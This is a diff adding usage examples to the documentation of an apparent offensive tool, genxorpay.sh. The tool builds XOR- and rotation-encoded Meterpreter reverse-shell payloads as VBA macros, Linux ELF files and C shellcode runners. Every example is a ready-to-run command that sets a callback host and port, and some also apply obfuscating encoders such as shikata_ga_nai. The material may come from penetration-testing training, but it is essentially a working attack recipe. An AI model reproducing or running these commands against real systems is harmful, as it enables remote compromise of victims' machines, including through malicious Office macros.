@@ -1,3 +1,7 @@
+# Exmaples
+The following are some example use cases of the script, there are many more ways to use this
+
+
 ### 1️⃣ Generate VBA Macro for Reverse HTTPS Meterpreter
 
 ```bash
@@ -43,3 +47,55 @@
 - Uses custom XOR key `0x2A`
 - Output: `evil_macro.vba`
 
+### 5️⃣ Generate Linux ELF Meterpreter Payload (x64)
+
+```bash
+./genxorpay.sh -lhost 192.168.45.237 -lport 443 -p 12 -key 0x41 -o met64.elf -i --arch x64 --format elf --platform linux
+```
+
+----
+
+### 6️⃣ Linux Shellcode with XOR-Encoded C Output
+
+```bash
+./genxorpay.sh -lhost 192.168.45.237 -lport 443 -p 13 -key 0x41 -o xor.c -i --arch x64 --format c --platform linux
+```
+
+- Generates XOR-encoded shellcode buffer for C payload
+- Output C file: `xor.c`
+- Includes decoder and shellcode runner
+
+---
+
+### 7️⃣ Linux Shellcode with Bit Rotation Encoding (C Output)
+
+```bash
+./genxorpay.sh -lhost 192.168.45.237 -lport 443 -p 13 -o rotate.c -i --arch x64 --format c --platform linux --rotate 2
+```
+
+- Applies bit-rotation (left by 2 bits) instead of XOR
+- Automatically decodes in the generated C file
+- Output C file: `rotate.c`
+
+---
+
+### 8️⃣ VBA Payload with Shikata Encoder (x86)
+
+```bash
+./genxorpay.sh -lhost 192.168.45.237 -lport 443 -p 4 -key 0x41 -o shigata.vba -i --arch x86 -e 1
+```
+
+- Uses `x86/shikata_ga_nai` encoder (index 1)
+- Also applies XOR
+- Output VBA macro: `shigata.vba`
+
+---
+
+### 9️⃣ Pure XOR VBA Shellcode (x86)
+
+```bash
+./genxorpay.sh -lhost 192.168.45.237 -lport 443 -p 4 -key 0x41 -o normalrev.vba -i --arch x86
+```
+
+- Only XOR applied (no encoder)
+- Output VBA file: `normalrev.vba`
